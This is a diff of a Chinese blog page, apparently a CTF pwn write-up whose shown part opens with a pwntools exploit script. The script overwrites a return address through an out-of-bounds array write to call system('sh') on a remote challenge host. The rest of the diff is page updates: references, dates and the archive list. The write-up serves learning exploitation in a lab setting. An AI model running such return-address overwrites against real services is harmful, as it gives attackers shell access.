remote(<span class="string">"220.249.52.133"</span>,<span class="number">35029</span>)</span><br><span class="line">retn_esp = <span class="number">0xffffd8bc</span></span><br><span class="line">ebp = <span class="number">0xffffd8a8</span></span><br><span class="line">v13 = ebp - <span class="number">0x70</span></span><br><span class="line">offset = retn_esp - ebp + <span class="number">0x70</span></span><br><span class="line">print(<span class="string">"[*] offset is"</span>,offset,<span class="string">"("</span>,hex(offset),<span class="string">")"</span>)</span><br><span class="line">system_addr = [<span class="number">0x50</span>,<span class="number">0x84</span>,<span class="number">0x04</span>,<span class="number">0x08</span>]</span><br><span class="line">sh = [<span class="number">0x87</span>,<span class="number">0x89</span>,<span class="number">0x04</span>,<span class="number">0x08</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start</span><span class="params">()</span>:</span></span><br><span class="line">	r.sendlineafter(<span class="string">"How many numbers you have:\n"</span>,<span class="string">"1"</span>)</span><br><span class="line">	r.sendlineafter(<span class="string">"Give me your numbers\n"</span>,<span class="string">"1"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Change_addr</span><span class="params">(offset,addr_part)</span>:</span></span><br><span class="line">	r.sendlineafter(<span class="string">"5. exit\n"</span>,<span class="string">"3"</span>)</span><br><span class="line">	r.sendlineafter(<span class="string">"which number to change:\n"</span>,str(offset))</span><br><span class="line">	r.sendlineafter(<span class="string">"new number:\n"</span>,str(addr_part))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">	<span class="comment"># 开始</span></span><br><span class="line">	start()</span><br><span class="line">	</span><br><span class="line">	<span class="comment"># 向返回地址写入system地址</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">4</span>):</span><br><span class="line">		Change_addr(offset+i,system_addr[i])</span><br><span class="line">	print(<span class="string">"[*] offset is"</span>,offset)</span><br><span class="line">	</span><br><span class="line">	<span class="comment"># 向system的参数位置写入sh地址</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">4</span>):</span><br><span class="line">		Change_addr(offset+j+<span class="number">8</span>,sh[j])</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 结束</span></span><br><span class="line">	r.recvuntil(<span class="string">"5. exit\n"</span>)</span><br><span class="line">	r.sendline(<span class="string">"5"</span>)	</span><br><span class="line">	r.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="font-color-navy0x04-referencefont"><a class="markdownIt-Anchor" href="#font-color-navy0x04-referencefont"></a> <font color="navy"><code>0x04 Reference</code></font></h3>
+<p>[1] <a href="https://www.zhihu.com/question/23440081" target="_blank" rel="noopener">为什么C语言中数组下标越界不报错？</a></p>
 <p>[2]  <a href="https://www.52tourism.com/C/42666.html?btwaf=35062607" target="_blank" rel="noopener">计算机为什么用二进制和十六进制</a></p>
 <p>[3] <a href="https://senitco.github.io/2017/06/07/string-processing/" target="_blank" rel="noopener">C/C++处理十六进制数和字符串</a></p>
-<p>[4] <a href="http://liul14n.top/2019/11/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Pwn%E8%BF%9B%E9%98%B6%E5%8C%BA(1" target="_blank" rel="noopener">攻防世界-Pwn进阶区(1)</a>/)</p>
+<p>[4] <a href="http://liul14n.top/2019/11/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Pwn%E8%BF%9B%E9%98%B6%E5%8C%BA(1)/" target="_blank" rel="noopener">攻防世界-Pwn进阶区(1)</a></p>
 
     </article>
     <!-- license  -->
@@ -547,7 +555,7 @@ height:50vh;
             <p>原文作者：<a href="https://muzibing.github.io">MUZIBing</a>
             </p><p>原文链接：<a href="https://muzibing.github.io/2020/06/08/2020.06.08（123）/">https://muzibing.github.io/2020/06/08/2020.06.08（123）/</a>
             </p><p>发表日期：<a href="https://muzibing.github.io/2020/06/08/2020.06.08（123）/">June 8th 2020, 12:00:00 am</a>
-            </p><p>更新日期：<a href="https://muzibing.github.io/2020/06/08/2020.06.08（123）/">June 8th 2020, 11:13:15 pm</a>
+            </p><p>更新日期：<a href="https://muzibing.github.io/2020/06/08/2020.06.08（123）/">June 14th 2020, 12:43:16 pm</a>
             </p><p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -699,7 +707,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-相关知识点"><span class="toc-number">1.</span> <span class="toc-text">0x00.相关知识点</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-retn-指令"><span class="toc-number">1.1.</span> <span class="toc-text">1.retn 指令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-数组溢出原理"><span class="toc-number">1.2.</span> <span class="toc-text">2.数组溢出原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-字符类型在数组中存放的形式（字符和字符字面值）"><span class="toc-number">1.3.</span> <span class="toc-text">3.字符类型在数组中存放的形式（字符和字符字面值）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-题目分析"><span class="toc-number">2.</span> <span class="toc-text">0x01 题目分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-解题步骤"><span class="toc-number">3.</span> <span class="toc-text">0x02 解题步骤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-EXP"><span class="toc-number">4.</span> <span class="toc-text">0x03 EXP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-Reference"><span class="toc-number">5.</span> <span class="toc-text">0x04 Reference</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#font-color-navy0x00相关知识点font"><span class="toc-number">1.</span> <span class="toc-text"> 0x00.相关知识点</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#font-color-blue1retn-指令font"><span class="toc-number">1.1.</span> <span class="toc-text"> 1.retn 指令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#font-color-blue2数组溢出原理font"><span class="toc-number">1.2.</span> <span class="toc-text"> 2.数组溢出原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#font-color-blue3字符类型在数组中存放的形式字符和字符字面值font"><span class="toc-number">1.3.</span> <span class="toc-text"> 3.字符类型在数组中存放的形式（字符和字符字面值）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#font-color-navy0x01-题目分析font"><span class="toc-number">2.</span> <span class="toc-text"> 0x01 题目分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#font-color-navy0x02-解题步骤font"><span class="toc-number">3.</span> <span class="toc-text"> 0x02 解题步骤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#font-color-navy0x03-expfont"><span class="toc-number">4.</span> <span class="toc-text"> 0x03 EXP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#font-color-navy0x04-referencefont"><span class="toc-number">5.</span> <span class="toc-text"> 0x04 Reference</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -2935,9 +2943,18 @@ top:50vh;
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 125
+        Total : 126
         </div>
         <!-- search  -->
         
@@ -2954,6 +2971,11 @@ top:50vh;
     
     <div class="archive-year"> 2020 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/14</span><a class="archive-post-title" href="/2020/06/14/2020.06.14（126）/">实模式下的段寄存器</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -3012,17 +3034,17 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">04/30</span><a class="archive-post-title" href="/2020/04/30/2020.04.29（112）/">pwntools的简单总结（持续更新）</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
             <span class="archive-post-date">04/30</span><a class="archive-post-title" href="/2020/04/30/2020.04.30（114）/">Dan-Boneh密码学课程之学习笔记（持续更新）</a>
         </li>
     
     
         <li class="archive-post-item">
             <span class="archive-post-date">04/30</span><a class="archive-post-title" href="/2020/04/30/2020.04.30（113）/">Hexo博客完善（持续更新）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/30</span><a class="archive-post-title" href="/2020/04/30/2020.04.29（112）/">pwntools的简单总结（持续更新）</a>
         </li>
     
     
@@ -3037,12 +3059,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">04/23</span><a class="archive-post-title" href="/2020/04/23/2020.04.24（109）/">Pwnable.kr的奇幻之旅（二）[collision]</a>
+            <span class="archive-post-date">04/23</span><a class="archive-post-title" href="/2020/04/23/2020.04.23（108）/">Pwnable.kr的奇幻之旅（一）[fd]</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">04/23</span><a class="archive-post-title" href="/2020/04/23/2020.04.23（108）/">Pwnable.kr的奇幻之旅（一）[fd]</a>
+            <span class="archive-post-date">04/23</span><a class="archive-post-title" href="/2020/04/23/2020.04.24（109）/">Pwnable.kr的奇幻之旅（二）[collision]</a>
         </li>
     
     
@@ -3092,12 +3114,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">03/04</span><a class="archive-post-title" href="/2020/03/04/2020.03.04（98）/">【转载】Data URI 知识点详解</a>
+            <span class="archive-post-date">03/04</span><a class="archive-post-title" href="/2020/03/04/2020.03.04（97）/">【转载】JavaScript 的隐式转换</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">03/04</span><a class="archive-post-title" href="/2020/03/04/2020.03.04（97）/">【转载】JavaScript 的隐式转换</a>
+            <span class="archive-post-date">03/04</span><a class="archive-post-title" href="/2020/03/04/2020.03.04（98）/">【转载】Data URI 知识点详解</a>
         </li>
     
     
@@ -3112,12 +3134,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">02/23</span><a class="archive-post-title" href="/2020/02/23/2020.02.23（94）/">【转载】 XSS 简单总结</a>
+            <span class="archive-post-date">02/23</span><a class="archive-post-title" href="/2020/02/23/2020.02.23（93）/">【转载】文件 HOSTS 的简介和修改方法</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">02/23</span><a class="archive-post-title" href="/2020/02/23/2020.02.23（93）/">【转载】文件 HOSTS 的简介和修改方法</a>
+            <span class="archive-post-date">02/23</span><a class="archive-post-title" href="/2020/02/23/2020.02.23（94）/">【转载】 XSS 简单总结</a>
         </li>
     
     
@@ -3763,24 +3785,9 @@ jsonContent:
     </div>
     <!-- async load share.js -->
     
-        <script src="/scripts/share.js" async></script>    
+        <script src="/scripts/share.js" async></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->    
      
-    <script type="text/x-mathjax-config">
-    MathJax.Hub.Config({
-        tex2jax: {
-            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
-            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
-            processEscapes: true
-        }
-    });
-    MathJax.Hub.Queue(function() {
-        var all = MathJax.Hub.getAllJax();
-        for (var i = 0; i < all.length; ++i)
-            all[i].SourceElement().parentNode.className += ' has-jax';
-    });
-</script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
-</body>
+    </body>
 </html>
 
 
